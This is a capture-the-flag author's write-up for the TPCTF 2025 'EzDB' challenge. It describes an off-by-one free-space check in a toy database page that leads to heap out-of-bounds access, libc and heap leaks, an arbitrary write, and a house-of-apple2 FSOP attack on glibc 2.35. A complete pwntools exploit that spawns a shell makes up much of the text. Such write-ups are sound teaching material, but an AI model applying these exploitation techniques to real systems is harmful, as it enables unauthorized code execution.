# TPCTF 2025 EzDB

Source code and attachment for this challenge is [here](https://github.com/Rosayxy/EzDB-SourceCode-TPCTF2025)

Visit [here](https://rosayxy.github.io/tpctf-author-writeup-ezdb/) for the author's writeup

## overview

This challenge is mainly inspired by the DB course of THU CST. Some resources of the course is [here](https://github.com/thu-db).

This challenge implements a table page to store stuff, with such basic functionalities as creating and removing a page, creating and editing entries in the page and such.

## vulnerability

At function `TablePage::InsertRecord`, it checks the following condition `TablePage::GetFreeSpaceSize(this) < (unsigned __int64)(Size + 4LL)`, whereas the `TablePage::GetFreeSpaceSize` is defined as below

```cpp
__int64 __fastcall TablePage::GetFreeSpaceSize(TablePage *this)
{
  return *((_QWORD *)this + 2) - *((_QWORD *)this + 1) + 1LL;
}
```

Actually, in the source code `*((_QWORD *)this + 2)`, `*((_QWORD *)this + 1)` are marked respectively as the higher and lower pointer of this page. We see its intialization below:

```cpp
TablePage *__fastcall TablePage::Init(TablePage *this)
{
  TablePage *result; // rax

  *(_QWORD *)this = malloc(0x400uLL);
  *((_QWORD *)this + 1) = *(_QWORD *)this;
  *((_QWORD *)this + 2) = *(_QWORD *)this + 0x400LL;
  result = this;
  *((_QWORD *)this + 3) = *(_QWORD *)this;
  return result;
}
```

So we get to know the GetFreeSize should be returning `*((_QWORD *)this + 2) - *((_QWORD *)this + 1)`. When we have `TablePage::GetFreeSpaceSize(this) == (unsigned __int64)(Size + 4LL)(the 4 is the slot size here)`, we have an overflow into the highest byte of the newest slot, which is defined as below in the source code

```cpp
struct Slot{
    unsigned short offset;
    unsigned short size;
};
```

So we can modify the size into a large value of the newest slot. This gives us a heap oob read & write with a big-enough-for-everything offset using the `TablePage::EditRecord` and `TablePage::GetRecord` functions.

## leak

We can stuff 7 pages into tcache bin first, when we free the 8th page, it goes into the unsorted bin and the fd and bk pointers are libc-related addresses. We can leak the libc base address from it.

The TablePage object’s page_, lower_, upper_ pointers are all heap addresses. We can leak the heap base address here.

## exploit

### convert to arbitrary write

We can convert a heap-arbitrary-write primitive to an arbitrary-write primitive by editing the upper_ pointer of a TablePage object at a higher heap address. We edit the upper_ pointer to an arbitrary address plus some offset. Then we can call `TablePage::InsertRecord` function of that TablePage object to write the content to the arbitrary address.

### FSOP

Because it is glibc-2.35, we choose to write _IO_list_all to a heap address and construct a fake IO_file object at the address.

The construct the fake IO_file using the idea of [house of apple2](https://bbs.kanxue.com/thread-273832.htm), then we return from the main function to trigger the FSOP, and guess what? We get the shell!

## exp

Note: I was having a fascinating Shakespeare elective course and multitasking when writing the exp. At first, I didn’t realize that the overflow in the page would overflow into the high byte rather than the low byte of the slot’s size, so some parts of the exp might be a bit messy. My apologies :(

```python
from pwn import*
context(log_level='debug',arch='amd64',os='linux')
p = process("./db")
# p = remote("61.147.171.105",52702)
libc = ELF("./libc.so.6")
def create_table(idx):
    p.recvuntil(">>> ")
    p.sendline("1")
    p.recvuntil("Index: ")
    p.sendline(str(idx))

def remove_table(idx):
    p.recvuntil(">>> ")
    p.sendline("2")
    p.recvuntil("Index: ")
    p.sendline(str(idx))

def insert_record(idx,len,content):
    p.recvuntil(">>> ")
    p.sendline("3")
    p.recvuntil("Index: ")
    p.sendline(str(idx))
    p.recvuntil("Length: ")
    p.sendline(str(len))
    p.recvuntil("Varchar: ")
    p.send(content)

def get_record(idx,slot_id):
    p.recvuntil(">>> ")
    p.sendline("4")
    p.recvuntil("Index: ")
    p.sendline(str(idx))
    p.recvuntil("Slot ID: ")
    p.sendline(str(slot_id))

def edit_record(idx,slot_id,len,content):
    p.recvuntil(">>> ")
    p.sendline("5")
    p.recvuntil("Index: ")
    p.sendline(str(idx))
    p.recvuntil("Slot ID: ")
    p.sendline(str(slot_id))
    p.recvuntil("Length: ")
    p.sendline(str(len))
    p.recvuntil("Varchar: ")
    p.send(content)

# leak libc first
# 整8个塞 tcache 里面吧
for i in range(9):
    create_table(i)
for i in range(203):
    insert_record(0,1,"A")
#insert vuln record
insert_record(0,6,b"\x02"*6)
for i in range(8):
    remove_table(8-i)

get_record(0,203)
p.recvline()
leaks = p.recv(0x140)
# 0x1d 0x106
heap_leak = u64(leaks[0xf2:0xf2 + 8])
print(hex(heap_leak))
libc_leak = u64(leaks[0x11a:(0x11a + 8)])
print(hex(libc_leak))
heap_base = heap_leak - 0x12320
# 0x7fbd726c7ce0 - 0x7fbd724ad000
libc_base = libc_leak - 0x21ace0
print(hex(heap_base))
print(hex(libc_base))
# 把所有堆块都占住 然后改 page_ 指针
for i in range(8):
    create_table(i+1)
# 占一个堆块写 fake IO_file
fake_io_addr = heap_base + 0x12730 +0x430 - 0xf0 # TODO
system_addr=libc_base+libc.sym["system"]
fake_io_file=b"  sh;".ljust(0x8,b"\x00")
fake_io_file+=p64(0)*3+p64(1)+p64(2)
fake_io_file=fake_io_file.ljust(0x30,b"\x00")
fake_io_file+=p64(0)
fake_io_file=fake_io_file.ljust(0x68,b"\x00")
fake_io_file+=p64(system_addr)
fake_io_file=fake_io_file.ljust(0x88,b"\x00")
fake_io_file+=p64(libc_base+0x21ca60) # lock
fake_io_file=fake_io_file.ljust(0xa0,b"\x00")
fake_io_file+=p64(fake_io_addr)
fake_io_file=fake_io_file.ljust(0xd8,b"\x00")
fake_io_file+=p64(0x216f40+libc_base) # 使得可以调用 _IO_wfile_overflow
fake_io_file+=p64(fake_io_addr)+p64(0) # 0xf0
# 直接溢出改 page_ 指针
insert_record(1,0xf0,fake_io_file)

payload = b"\x02"*6+b"a"*203 + p64(0)+p64(0x31)+p64(heap_base + 0x12320)*2+p64(libc_base + libc.sym["_IO_list_all"]+0x8)+p64(heap_base + 0x12320)
edit_record(0,203,0x140,payload)
insert_record(8,0x8,p64(fake_io_addr))

# trigger!
p.recvuntil(">>> ")
p.sendline("6")

p.interactive()
```

## conclusion

Thank everyone for participating in the TPCTF game! Spring is coming and hope you have a nice time!

[Here](https://github.com/Rosayxy/EzDB-SourceCode-TPCTF2025/tree/main) is the source code.
